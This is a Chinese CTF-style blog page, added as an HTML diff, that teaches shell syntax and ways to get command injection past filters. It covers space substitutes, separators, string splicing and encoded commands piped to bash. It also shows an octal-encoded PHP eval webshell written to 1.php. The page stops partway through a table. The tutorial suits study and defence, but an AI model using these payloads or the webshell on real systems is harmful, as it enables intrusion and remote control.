@@ -1,0 +1,1521 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>命令注入及其绕过方式 - 明月归的小站</title>
+  
+    <meta name="keywords" content="web,ctf,bypass,命令执行">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍了命令注入中的一些绕过方式！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">命令注入及其绕过方式</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/">
+      命令注入及其绕过方式
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2019年12月31日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：3.7k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：14分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/" class="leancloud_visitors" data-flag-title="命令注入及其绕过方式">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍了命令注入中的一些绕过方式！</p>
+<a id="more"></a>
+
+<h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><h3 id><a href="#" class="headerlink" title="|"></a>|</h3><p>管道符，连结上个指令的标准输出，做为下个指令的标准输入</p>
+<h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>用户有时候执行命令要花很长时间，可能会影响做其他事情。最好的方法是将它放在后台执行。后台运行的程序在用户注销后系统还可以继续执行。当要把命令放在后台执行时，在命令的后面加上<code>&amp;</code></p>
+<h3 id="amp-amp-和"><a href="#amp-amp-和" class="headerlink" title="&amp;&amp;和||"></a>&amp;&amp;和||</h3><p><code>shell</code>在执行某个命令的时候，会返回一个返回值，该返回值保存在<code>shell</code>变量 <code>$?</code> 中。当 <code>$? == 0</code> 时，表示执行成功；当 <code>$? == 1</code> 时，表示执行失败。有时候，下一条命令依赖前一条命令是否执行成功。如：在成功地执行一条命令之后再执行另一条命令，或者在一条命令执行失败后再执行另一条命令等。<code>shell</code>提供了<code>&amp;&amp;</code>和<code>||</code>来实现命令执行控制的功能，<code>shell</code>将根据<code>&amp;&amp;</code>或<code>||</code>前面命令的返回值来控制其后面命令的执行</p>
+<h4 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2 [&amp;&amp; command3 ...]  </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。</li>
+<li>只有在<code>&amp;&amp;</code>左边的命令返回真（命令返回值 <code>$? == 0</code>），<code>&amp;&amp;</code>右边的命令才会被执行</li>
+<li>只要有一个命令返回假（命令返回值 <code>$? == 1</code>），后面的命令就不会被执行</li>
+</ul>
+<h4 id="-1"><a href="#-1" class="headerlink" title="||"></a>||</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 || command2 [|| command3 ...]  </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>命令之间使用 || 连接，实现逻辑或的功能。</li>
+<li>只有在 || 左边的命令返回假（命令返回值 <code>$? == 1</code>），<code>||</code>右边的命令才会被执行。这和<code>c</code>语言中的逻辑或语法功能相同，即实现短路逻辑或操作。</li>
+<li>只要有一个命令返回真（命令返回值 <code>$? == 0</code>），后面的命令就不会被执行。</li>
+</ul>
+<h3 id="反引号"><a href="#反引号" class="headerlink" title="`反引号"></a>`反引号</h3><p>命令替代，大部分<code>Unix shell</code>以及编程语言如<code>Perl</code>、<code>PHP</code>以及<code>Ruby</code>等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项</p>
+<h3 id="‘单引号"><a href="#‘单引号" class="headerlink" title="‘单引号"></a>‘单引号</h3><p>被单引号括住的内容,将被视为单一字符串。在引号内的变量<code>$</code>符号将会失效，也就是说，将被视作一般符号处理。</p>
+<h3 id="“双引号"><a href="#“双引号" class="headerlink" title="“双引号"></a>“双引号</h3><p>被双引号括住的内容，将被视为单一字符串，防止通配符的扩展，但允许变量扩展 ，这点与单引号的处理方式不同</p>
+<h3 id="指令群组"><a href="#指令群组" class="headerlink" title="()指令群组"></a>()指令群组</h3><p>格式为：(command1;command2[;command3…])</p>
+<ul>
+<li>一条命令需要独占一个物理行，如果需要将多条命令放在同一行，命令之间使用命令分隔符（;）分隔。执行的效果等同于多个独立的命令单独执行的效果。</li>
+<li>表示在当前 shell 中将多个命令作为一个整体执行。需要注意的是，使用 () 括起来的命令在执行前面都不会切换当前工作目录，也就是说命令组合都是在当前工作目录下被执行的，尽管命令中有切换目录的命令。</li>
+<li>命令组合常和命令执行控制结合起来使用。</li>
+</ul>
+<p>用括号将一串连续指令括起来，这种用法对<code>shell</code>来说，称为指令群组。如下面的例子:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">cd</span> ~ ; vcgh=`<span class="built_in">pwd</span>` ;<span class="built_in">echo</span> <span class="variable">$vcgh</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/20191231154412.png"></p>
+<h3 id="大括号"><a href="#大括号" class="headerlink" title="{}大括号"></a>{}大括号</h3><p>其实大括号有一种拼接字符串的用法，<code>&#123;xx,yy,zz,...&#125;</code>这种大括号的组合，常用在字串的组合上，来看个例子</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#123;userA,userB,userC&#125;-&#123;home,bin,data&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们得到<code>userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data</code>文件夹。</p>
+<p><img src="/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/20191231155709.png"></p>
+<p>于是我们可以用来查看flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#123;/fl,/fla&#125;&#123;ag,g&#125;</span><br><span class="line">flag&#123;xxx&#125;</span><br><span class="line">cat: /flg: No such file or directory</span><br><span class="line">cat: /flaag: No such file or directory</span><br><span class="line">flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="中括号"><a href="#中括号" class="headerlink" title="[]中括号"></a>[]中括号</h3><p>这个符号在正则表达式中担任类似 “范围” 或 “集合” 的角色。</p>
+<p><img src="/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/20191231160313.png"></p>
+<h3 id="小括号，中括号，和大括号的区别"><a href="#小括号，中括号，和大括号的区别" class="headerlink" title="小括号，中括号，和大括号的区别"></a>小括号，中括号，和大括号的区别</h3><p>那么，下面又涉及到了一个问题，就是小括号，中括号，和大括号的区别。</p>
+<ol>
+<li>单小括号，(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后可以没有分号。把<code>command group</code>放在<code>subshell</code>去执行，也叫做<code>nested sub-shell</code>。</li>
+<li>单大括号，{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。花括号是在同一个 shell 內完成，也称为 <code>non-namedcommand group</code>。</li>
+</ol>
+<p>所以说，如果在shell里面执行“函数”，需要用到{}，实际上也就是一个命令群组么。<br>不过，根据实测，<code>test=$(ls -a)</code>可以执行，但是<code>test=$&#123;ls–a&#125;</code>语法上面是有错误的。估计也和上面所说的原因有关。</p>
+<p>另外，从网上摘录的区别如下：</p>
+<ul>
+<li>()只是对一串命令重新开一个子shell进行执行</li>
+<li>{}对一串命令在当前shell执行</li>
+<li>()和{}都是把一串的命令放在括号里面，并且命令之间用;号隔开</li>
+<li>()最后一个命令可以不用分号</li>
+<li>{}最后一个命令要用分号</li>
+<li>{}的第一个命令和左括号之间必须要有一个空格</li>
+<li>()里的各命令不必和括号有空格</li>
+<li>()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令</li>
+</ul>
+<p>这里引出来<code>[..]</code>和<code>[[...]]</code>的区别：使用<code>[[...]]</code>条件判断结构, 而不是<code>[...]</code>, 能够防止脚本中的许多逻辑错误.比如<code>&amp;&amp;</code>,<code>||</code>,<code>&lt;</code>,和<code>&gt;</code> 操作符能够正常存在于<code>[[ ]]</code>条件判断结构中, 但是如果出现在<code>[]</code>结构中的话，会报错。</p>
+<p>对<code>&#123;&#125;</code>和<code>()</code>而言, 括号中的重定向符只影响该条命令， 而括号外的重定向符影响到括号中的所有命令。</p>
+<h3 id="输入输出-重定向"><a href="#输入输出-重定向" class="headerlink" title="输入输出/重定向"></a>输入输出/重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;      &gt;&gt;   &lt;   &lt;&lt;   :&gt;   &amp;&gt;   2&amp;&gt;   2&lt;&gt;&gt;&amp;   &gt;&amp;2</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符(File Descriptor)，用一个数字（通常为0-9）来表示一个文件。</p>
+<table>
+<thead>
+<tr>
+<th align="left">文件描述符</th>
+<th align="left">名称</th>
+<th align="left">常用缩写</th>
+<th align="left">默认值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0</td>
+<td align="left">标准输入</td>
+<td align="left">stdin</td>
+<td align="left">键盘</td>
+</tr>
+<tr>
+<td align="left">1</td>
+<td align="left">标准输出</td>
+<td align="left">stdout</td>
+<td align="left">屏幕</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left">标准错误输出</td>
+<td align="left">stderr</td>
+<td align="left">屏幕</td>
+</tr>
+</tbody></table>
+<p>我们在简单地用<code>&lt;</code>或<code>&gt;</code>时，相当于使用<code>0&lt;</code>或<code>1&gt;</code>（下面会详细介绍）。</p>
+<ul>
+<li><p>cmd &gt; file<br>把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。</p>
+</li>
+<li><p>cmd &gt;&gt; file<br>把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。</p>
+</li>
+<li><p>cmd &lt; file<br>使cmd命令从file读入</p>
+</li>
+<li><p>cmd &lt;&lt; text<br>从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用<code>&lt;&lt;-</code> ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。</p>
+</li>
+<li><p>cmd &lt;&lt;&lt; word<br>把word（而不是文件word）和后面的换行作为输入提供给cmd。</p>
+</li>
+<li><p>cmd &lt;&gt; file<br>以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。</p>
+</li>
+<li><p>cmd &gt;| file<br>功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用<code>&gt;!</code>实现这一功能。</p>
+</li>
+<li><p>: &gt; filename</p>
+<p>把文件<code>filename</code>截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与<code>touch</code>的效果相同).</p>
+</li>
+<li><p>cmd &gt;&amp;n</p>
+<p>把输出送到文件描述符n</p>
+</li>
+<li><p>cmd m&gt;&amp;n</p>
+<p>把输出到文件符m的信息重定向到文件描述符n</p>
+</li>
+<li><p>cmd &gt;&amp;-</p>
+<p>关闭标准输出</p>
+</li>
+<li><p>cmd &lt;&amp;n</p>
+<p>输入来自文件描述符n</p>
+</li>
+<li><p>cmd m&lt;&amp;n</p>
+<p>m来自文件描述各个n</p>
+</li>
+<li><p>cmd &lt;&amp;-</p>
+<p>关闭标准输入</p>
+</li>
+<li><p>cmd &lt;&amp;n-</p>
+<p>移动输入文件描述符n而非复制它。</p>
+</li>
+<li><p>cmd &gt;&amp;n-</p>
+<p>移动输出文件描述符n而非复制它。<br>注意： <code>&gt;&amp;</code>实际上复制了文件描述符，这使得<code>cmd &gt; file 2&gt;&amp;1</code>与<code>cmd 2&gt;&amp;1 &gt;file</code>的效果不一样。</p>
+</li>
+</ul>
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>还有一类通配符，首先先了解下什么是Linux shell通配符/glob模式:</p>
+<blockquote>
+<p>glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 <code>/etc/glob</code> （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为精简了的正则表达式，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。<strong>shell 通配符 / glob 模式通常用来匹配目录以及文件，而不是文本！！！</strong></p>
+</blockquote>
+<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><table>
+<thead>
+<tr>
+<th align="left">字符</th>
+<th align="left">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">*</td>
+<td align="left">匹配任意长度任意字符</td>
+</tr>
+<tr>
+<td align="left">?</td>
+<td align="left">匹配任意单个字符</td>
+</tr>
+<tr>
+<td align="left">[list]</td>
+<td align="left">匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td>
+</tr>
+<tr>
+<td align="left">[^list]</td>
+<td align="left">匹配指定范围外的任意单个字符或字符集合</td>
+</tr>
+<tr>
+<td align="left">[!list]</td>
+<td align="left">同<code>[^list]</code></td>
+</tr>
+<tr>
+<td align="left">{str1,str2,…}</td>
+<td align="left">匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td>
+</tr>
+<tr>
+<td align="left">IFS</td>
+<td align="left">由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td>
+</tr>
+<tr>
+<td align="left">CR</td>
+<td align="left">由 &lt; enter &gt; 产生</td>
+</tr>
+<tr>
+<td align="left">!</td>
+<td align="left">执行 history 中的命令</td>
+</tr>
+</tbody></table>
+<p>以及还有专用字符集</p>
+<table>
+<thead>
+<tr>
+<th align="left">字符</th>
+<th align="left">意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">[:alnum:]</td>
+<td align="left">任意数字或者字母</td>
+</tr>
+<tr>
+<td align="left">[:alpha:]</td>
+<td align="left">任意字母</td>
+</tr>
+<tr>
+<td align="left">[:space:]</td>
+<td align="left">空格</td>
+</tr>
+<tr>
+<td align="left">[:lower:]</td>
+<td align="left">小写字母</td>
+</tr>
+<tr>
+<td align="left">[:digit:]</td>
+<td align="left">任意数字</td>
+</tr>
+<tr>
+<td align="left">[:upper:]</td>
+<td align="left">任意大写字母</td>
+</tr>
+<tr>
+<td align="left">[:cntrl:]</td>
+<td align="left">控制符</td>
+</tr>
+<tr>
+<td align="left">[:graph:]</td>
+<td align="left">图形</td>
+</tr>
+<tr>
+<td align="left">[:print:]</td>
+<td align="left">可打印字符</td>
+</tr>
+<tr>
+<td align="left">[:punct:]</td>
+<td align="left">标点符号</td>
+</tr>
+<tr>
+<td align="left">[:xdigit:]</td>
+<td align="left">十六进制数</td>
+</tr>
+<tr>
+<td align="left">[:blank:]</td>
+<td align="left">空白字符</td>
+</tr>
+</tbody></table>
+<ul>
+<li>在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如<code>[[:space:]]</code></li>
+<li>想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询</li>
+<li>在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符</li>
+</ul>
+<h2 id="命令执行的一些绕过技巧"><a href="#命令执行的一些绕过技巧" class="headerlink" title="命令执行的一些绕过技巧"></a>命令执行的一些绕过技巧</h2><h3 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1. 空格绕过"></a>1. 空格绕过</h3><p>空格可以用以下字符串代替：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS等</span><br></pre></td></tr></table></figure>
+
+<p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用<br>，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
+<h3 id="2-一些命令分隔符"><a href="#2-一些命令分隔符" class="headerlink" title="2.一些命令分隔符"></a>2.一些命令分隔符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
+
+<p>1、在 shell 中，担任”连续指令”功能的符号就是”;”<br>2、”&amp;” 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。<br>3、管道符”|”左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示</p>
+<h3 id="3-花括号的别样用法"><a href="#3-花括号的别样用法" class="headerlink" title="3.花括号的别样用法"></a>3.花括号的别样用法</h3><p>在Linux bash中还可以使用<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>来执行系统命令</p>
+<p><img src="/2019/12/31/%E7%9F%A5%E8%AF%86%E7%82%B9/command-exec-bypass/20190915145314225.png"></p>
+<h3 id="4-黑名单绕过"><a href="#4-黑名单绕过" class="headerlink" title="4.黑名单绕过"></a>4.黑名单绕过</h3><h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><p>比如：<code>a=l;b=s;$a$b</code><br>上面的第二道题目也是利用偶读拼接方法绕过黑名单：<code>a=fl;b=ag;cat $a$b</code></p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p><strong>base64：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> MTIzCg==|base64 -d 其将会打印<span class="number">123</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|base64-d|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>hex：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;636174202f666c6167&quot;</span> | xxd -r -p|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>oct：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>) ==&gt;ls</span><br><span class="line">$(printf <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) ==&gt;cat /flag</span><br><span class="line">&#123;printf,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\$<span class="number">0</span> ==&gt;cat /flag</span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span></span><br><span class="line">$&#123;printf,<span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span>&#125; &gt;&gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure>
+
+<h4 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a>单引号和双引号绕过</h4><p>比如：<code>ca&#39;&#39;t flag</code> 或<code>ca&quot;&quot;t flag</code></p>
+<h4 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h4><p>比如：<code>ca\t fl\ag</code></p>
+<h4 id="利用Shell-特殊变量绕过"><a href="#利用Shell-特殊变量绕过" class="headerlink" title="利用Shell 特殊变量绕过"></a>利用Shell 特殊变量绕过</h4><table>
+<thead>
+<tr>
+<th align="center">变量</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">$0</td>
